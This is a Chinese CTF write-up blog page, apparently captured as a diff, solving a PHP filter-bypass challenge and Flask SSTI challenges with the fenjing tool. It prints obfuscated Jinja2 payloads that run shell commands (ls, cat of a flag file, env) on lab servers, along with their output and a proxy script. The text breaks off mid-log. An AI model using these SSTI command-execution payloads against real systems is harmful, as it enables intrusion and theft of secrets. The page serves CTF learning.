@@ -1,0 +1,360 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>NSILAB淘汰赛复现 | Welcome！This is Oight！</title><meta name="author" content="Oight"><meta name="copyright" content="Oight"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Web1.Sign in创建实例查看源码： 1234567891011121314151617181920Flag is not here!&lt;?phperror_reporting(0);include_once &#x27;flag.php&#x27;;if ($_SERVER[&#x27;QUERY_STRING&#x27;]) &#123;    if (preg_match(&amp;quo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSILAB淘汰赛复现">
+<meta property="og:url" content="http://oight.github.io/posts/2c44bf77/index.html">
+<meta property="og:site_name" content="Welcome！This is Oight！">
+<meta property="og:description" content="Web1.Sign in创建实例查看源码： 1234567891011121314151617181920Flag is not here!&lt;?phperror_reporting(0);include_once &#x27;flag.php&#x27;;if ($_SERVER[&#x27;QUERY_STRING&#x27;]) &#123;    if (preg_match(&amp;quo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://oight.github.io/img/1.jpg">
+<meta property="article:published_time" content="2025-03-15T04:10:24.000Z">
+<meta property="article:modified_time" content="2025-03-15T08:39:51.358Z">
+<meta property="article:author" content="Oight">
+<meta property="article:tag" content="周报">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://oight.github.io/img/1.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://oight.github.io/posts/2c44bf77/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'NSILAB淘汰赛复现',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/background.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Welcome！This is Oight！</span></a><a class="nav-page-title" href="/"><span class="site-name">NSILAB淘汰赛复现</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">NSILAB淘汰赛复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-15T04:10:24.000Z" title="发表于 2025-03-15 12:10:24">2025-03-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-15T08:39:51.358Z" title="更新于 2025-03-15 16:39:51">2025-03-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-Sign-in"><a href="#1-Sign-in" class="headerlink" title="1.Sign in"></a>1.Sign in</h2><p>创建实例查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Flag is not here!</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z]+/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;I hate English!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nsilab&#x27;</span>]), <span class="number">0</span>, <span class="number">4</span>) !== <span class="string">&quot;ba3f&quot;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;hi&#x27;</span>] !== <span class="string">&quot;web&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Oops! It&#x27;s wrong!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;You are not admin!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">locate</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>经典的绕过签到题，我们发现三层过滤。</p>
+<p>第一层使用正则表达式匹配了英文字母，因此我们在传递参数的时候要进行转码</p>
+<p>第二层使用POST参数传递nsilab，要求nsilab值的MD5编码前四位是ba3f；</p>
+<p>这里用脚本来匹配MD5</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;ba3f&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">    s = <span class="built_in">str</span>(i)</span><br><span class="line">    hash_md5 = hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> hash_md5.startswith(target):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found: <span class="subst">&#123;s&#125;</span> → <span class="subst">&#123;hash_md5&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">  // Found: <span class="number">35350</span> → ba3fe3d296f3e7269b66f163d31b3dc3</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>用GET方式传参hi &#x3D; web，对这里进行URL编码，将参数名和值URL编码为十六进制形式：</p>
+<ul>
+<li><code>hi</code> → <code>%68%69</code>（h的ASCII码是0x68，i是0x69）</li>
+<li><code>web</code> → <code>%77%65%62</code>（w&#x3D;0x77, e&#x3D;0x65, b&#x3D;0x62）</li>
+<li><strong>构造查询字符串</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%68%69=%77%65%62</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>第三层在COOKIE传参更改user &#x3D; admin</p>
+<p>传参后发现弹出窗口提示flag要飞走了，使用BurpSuite抓包发现flag</p>
+<h2 id="2-ezssti"><a href="#2-ezssti" class="headerlink" title="2.ezssti"></a>2.ezssti</h2><p>由题，得到这是一道SSTI</p>
+<p>进去尝试传递49，返回“你是…Hacker!!!吗？”可知这里存在过滤。</p>
+<p>使用焚靖来绕过waf自动SSTI</p>
+<blockquote>
+<p>fenjing crack -u “<a target="_blank" rel="noopener" href="http://contest.ctf.nefu.edu.cn:33099/">http://contest.ctf.nefu.edu.cn:33099/</a>“ -i name -m GET –detect-mode fast  </p>
+</blockquote>
+<p>成功绕过，ls一下  </p>
+<pre><code>$&gt;&gt; ls
+INFO:[full_payload_gen] | Start generating final expression...
+INFO:[payload_gen] | Great, string(&#39;ls&#39;) can be &#39;l&#39;+&#39;s&#39;
+INFO:[payload_gen] | Great, we generate os_popen_obj(&#39;ls&#39;)
+INFO:[payload_gen] | Great, we generate os_popen_read(&#39;ls&#39;)
+INFO:[cli] | Submit payload 
+&#123;&#123;
+    ((cycler.next['_'+'_'+'g'+'l'+'o'+'b'+'a'+'l'+'s'+'_'+'_']['_'+'_'+'g'+'e'+'t'+'i'+'t'+'e'+'m'+'_'+'_']('_'+'_'+'b'+'u'+'i'+'l'+'t'+'i'+'n'+'s'+'_'+'_'))['_'+'_'+'g'+'e'+'t'+'i'+'t'+'e'+'m'+'_'+'_']('_'+'_'+'i'+'m'+'p'+'o'+'r'+'t'+'_'+'_'))('o'+'s').popen('l'+'s').read()                                                                                                                                                             
+    &#125;&#125;                                                                                                                                                                                                                    
+                                                                                                                                                                                                                    
+
+        &lt;html&gt;
+        &lt;head&gt;
+            &lt;title&gt;请告诉我你的名字~&lt;/title&gt;
+            &lt;link href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+            &lt;div class=&quot;container mt-5&quot;&gt;
+                &lt;h2&gt;请告诉我你的名字：&lt;/h2&gt;
+                &lt;p&gt;kimi no namai wa?&lt;/p&gt;
+                &lt;form method=&quot;GET&quot;&gt;
+                    &lt;div class=&quot;form-group&quot;&gt;
+                        &lt;label for=&quot;name&quot;&gt;Your Name:&lt;/label&gt;
+                        &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;name&quot; name=&quot;name&quot; placeholder=&quot;Type Your Name Here&quot;&gt;
+                    &lt;/div&gt;
+                    &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Submit&lt;/button&gt;
+                &lt;/form&gt;
+                &lt;div class=&quot;alert alert-info&quot;&gt;你是...
+app.py
+
+吗？&lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/body&gt;
+        &lt;/html&gt;
+</code></pre>
+<p>只发现了 <code>app.py</code></p>
+<p>ls -a 同样只有<code>app.py</code></p>
+<p>用cd .. &amp;&amp; ls -a 到根目录下看看</p>
+<pre><code>$&gt;&gt; cd .. &amp;&amp; ls -a
+INFO:[full_payload_gen] | Start generating final expression...
+INFO:[payload_gen] | Great, string(&#39;cd .. &amp;&amp; ls -a&#39;) can be &#39;c&#39;+&#39;d&#39;+&#39; &#39;+&#39;.&#39;+&#39;.&#39;+&#39; &#39;+&#39;&amp;&#39;+&#39;&amp;&#39;+&#39; &#39;+&#39;l&#39;+&#39;s&#39;+&#39; &#39;+&#39;-&#39;+&#39;a&#39;
+INFO:[payload_gen] | Great, we generate os_popen_obj(&#39;cd .. &amp;&amp; ls -a&#39;)
+INFO:[payload_gen] | Great, we generate os_popen_read(&#39;cd .. &amp;&amp; ls -a&#39;)
+INFO:[cli] | Submit payload 
+&#123;&#123;
+    ((cycler.next['_'+'_'+'g'+'l'+'o'+'b'+'a'+'l'+'s'+'_'+'_']['_'+'_'+'g'+'e'+'t'+'i'+'t'+'e'+'m'+'_'+'_']('_'+'_'+'b'+'u'+'i'+'l'+'t'+'i'+'n'+'s'+'_'+'_'))['_'+'_'+'g'+'e'+'t'+'i'+'t'+'e'+'m'+'_'+'_']('_'+'_'+'i'+'m'+'p'+'o'+'r'+'t'+'_'+'_'))('o'+'s').popen('c'+'d'+' '+'.'+'.'+' '+'&'+'&'+' '+'l'+'s'+' '+'-'+'a').read()                                                                                                             
+    &#125;&#125;                                                                                                                                                                                                                    
+                                                                                                                                                                                                                    
+
+        &lt;html&gt;
+        &lt;head&gt;
+            &lt;title&gt;请告诉我你的名字~&lt;/title&gt;
+            &lt;link href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+            &lt;div class=&quot;container mt-5&quot;&gt;
+                &lt;h2&gt;请告诉我你的名字：&lt;/h2&gt;
+                &lt;p&gt;kimi no namai wa?&lt;/p&gt;
+                &lt;form method=&quot;GET&quot;&gt;
+                    &lt;div class=&quot;form-group&quot;&gt;
+                        &lt;label for=&quot;name&quot;&gt;Your Name:&lt;/label&gt;
+                        &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;name&quot; name=&quot;name&quot; placeholder=&quot;Type Your Name Here&quot;&gt;
+                    &lt;/div&gt;
+                    &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Submit&lt;/button&gt;
+                &lt;/form&gt;
+                &lt;div class=&quot;alert alert-info&quot;&gt;你是...
+.
+..
+.dockerenv
+.flll4ggggg
+app
+bin
+dev
+etc
+home
+lib
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+start.sh
+sys
+tmp
+usr
+var
+
+吗？&lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/body&gt;
+        &lt;/html&gt;
+</code></pre>
+<p>发现.flll4gggg文件，cat一下</p>
+<pre><code>$&gt;&gt; cat /.flll4ggggg
+INFO:[full_payload_gen] | Start generating final expression...
+INFO:[payload_gen] | Great, string(&#39;cat /.flll4ggggg&#39;) can be &#39;c&#39;+&#39;a&#39;+&#39;t&#39;+&#39; &#39;+&#39;/&#39;+&#39;.&#39;+&#39;f&#39;+&#39;l&#39;+&#39;l&#39;+&#39;l&#39;+&#39;4&#39;+&#39;g&#39;+&#39;g&#39;+&#39;g&#39;+&#39;g&#39;+&#39;g&#39;
+INFO:[payload_gen] | Great, we generate os_popen_obj(&#39;cat /.flll4ggggg&#39;)
+INFO:[payload_gen] | Great, we generate os_popen_read(&#39;cat /.flll4ggggg&#39;)
+INFO:[cli] | Submit payload 
+&#123;&#123;
+    ((cycler.next['_'+'_'+'g'+'l'+'o'+'b'+'a'+'l'+'s'+'_'+'_']['_'+'_'+'g'+'e'+'t'+'i'+'t'+'e'+'m'+'_'+'_']('_'+'_'+'b'+'u'+'i'+'l'+'t'+'i'+'n'+'s'+'_'+'_'))['_'+'_'+'g'+'e'+'t'+'i'+'t'+'e'+'m'+'_'+'_']('_'+'_'+'i'+'m'+'p'+'o'+'r'+'t'+'_'+'_'))('o'+'s').popen('c'+'a'+'t'+' '+'/'+'.'+'f'+'l'+'l'+'l'+'4'+'g'+'g'+'g'+'g'+'g').read()                                                                                                     
+    &#125;&#125;                                                                                                                                                                                                                    
+                                                                                                                                                                                                                    
+
+        &lt;html&gt;
+        &lt;head&gt;
+            &lt;title&gt;请告诉我你的名字~&lt;/title&gt;
+            &lt;link href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+            &lt;div class=&quot;container mt-5&quot;&gt;
+                &lt;h2&gt;请告诉我你的名字：&lt;/h2&gt;
+                &lt;p&gt;kimi no namai wa?&lt;/p&gt;
+                &lt;form method=&quot;GET&quot;&gt;
+                    &lt;div class=&quot;form-group&quot;&gt;
+                        &lt;label for=&quot;name&quot;&gt;Your Name:&lt;/label&gt;
+                        &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;name&quot; name=&quot;name&quot; placeholder=&quot;Type Your Name Here&quot;&gt;
+                    &lt;/div&gt;
+                    &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Submit&lt;/button&gt;
+                &lt;/form&gt;
+                &lt;div class=&quot;alert alert-info&quot;&gt;你是...
+nsilab&#123;71e70fed-9cf5-48d3-aa28-13c3ebaa3ebb&#125;
+
+吗？&lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/body&gt;
+        &lt;/html&gt; 
+</code></pre>
+<p>得到flag</p>
+<p>同时我也在NSSCTF上找到同样使用焚靖的SSTI，这里记录一下：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3613">[HZNUCTF 2023 preliminary]flask</a></p>
+</blockquote>
+<p>创建实例发现确实是SSTI，但是它会把传递的所有参数都反写</p>
+<pre><code>http://node5.anna.nssctf.cn:21944/?name=&#123;a+b&#125;
+回显:
+hello! &#125;b a&#123;
+</code></pre>
+<p>所以我们需要写个脚本来处理一下我们的输入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 验证 name 参数是否有效</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> name:</span><br><span class="line">        <span class="keyword">return</span> jsonify(error=<span class="string">&quot;Missing &#x27;name&#x27; parameter&quot;</span>), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        reversed_name = name[::-<span class="number">1</span>]  <span class="comment"># 反转名字</span></span><br><span class="line">        result = to_proxy(reversed_name)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(error=<span class="built_in">str</span>(e)), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_proxy</span>(<span class="params">name</span>):</span><br><span class="line">    base_url = <span class="string">&quot;http://node5.anna.nssctf.cn:21944/&quot;</span></span><br><span class="line">    params = &#123;<span class="string">&#x27;name&#x27;</span>: name&#125;  <span class="comment"># 使用参数字典避免手动拼接</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 2. 使用 requests 的参数化 URL 并设置超时</span></span><br><span class="line">        resp = requests.get(base_url, params=params, timeout=<span class="number">5</span>)</span><br><span class="line">        resp.raise_for_status()  <span class="comment"># 检查 HTTP 错误（如 404、500）</span></span><br><span class="line">        <span class="keyword">return</span> resp.text</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">f&quot;Proxy request failed: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">30000</span>, debug=<span class="literal">False</span>)</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">然后使用焚靖</span><br><span class="line"></span><br><span class="line">&gt; fenjing crack -u <span class="string">&quot;http://198.18.0.1:30000/proxy&quot;</span> -i name -m GET --detect-mode fast  </span><br><span class="line"></span><br><span class="line">ls 发现只有</span><br><span class="line"></span><br><span class="line">    hello! app.py</span><br><span class="line">    require.txt</span><br><span class="line"></span><br><span class="line">env看看环境变量</span><br><span class="line"></span><br><span class="line">    $&gt;&gt; env</span><br><span class="line">    INFO:[full_payload_gen] | Start generating final expression...</span><br><span class="line">    INFO:[payload_gen] | Great, string(<span class="string">&#x27;env&#x27;</span>) can be <span class="string">&#x27;e&#x27;</span>+<span class="string">&#x27;n&#x27;</span>+<span class="string">&#x27;v&#x27;</span></span><br><span class="line">    INFO:[payload_gen] | Great, we generate os_popen_obj(<span class="string">&#x27;env&#x27;</span>)</span><br><span class="line">    INFO:[payload_gen] | Great, we generate os_popen_read(<span class="string">&#x27;env&#x27;</span>)</span><br><span class="line">    INFO:[cli] | Submit payload &#123;%<span class="built_in">print</span> (((((cycler|attr(<span class="string">&#x27;n&#x27;</span>+<span class="string">&#x27;e&#x27;</span>+<span class="string">&#x27;x&#x27;</span>+<span class="string">&#x27;t&#x27;</span>)|attr(<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;g&#x27;</span>+<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;b&#x27;</span>+<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>)|attr(<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;g&#x27;</span>+<span class="string">&#x27;e&#x27;</span>+<span class="string">&#x27;t&#x27;</span>+<span class="string">&#x27;i&#x27;</span>+<span class="string">&#x27;t&#x27;</span>+<span class="string">&#x27;e&#x27;</span>+<span class="string">&#x27;m&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>))(<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;b&#x27;</span>+<span class="string">&#x27;u&#x27;</span>+<span class="string">&#x27;i&#x27;</span>+<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;t&#x27;</span>+<span class="string">&#x27;i&#x27;</span>+<span class="string">&#x27;n&#x27;</span>+<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>)|attr(<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;g&#x27;</span>+<span class="string">&#x27;e&#x27;</span>+<span 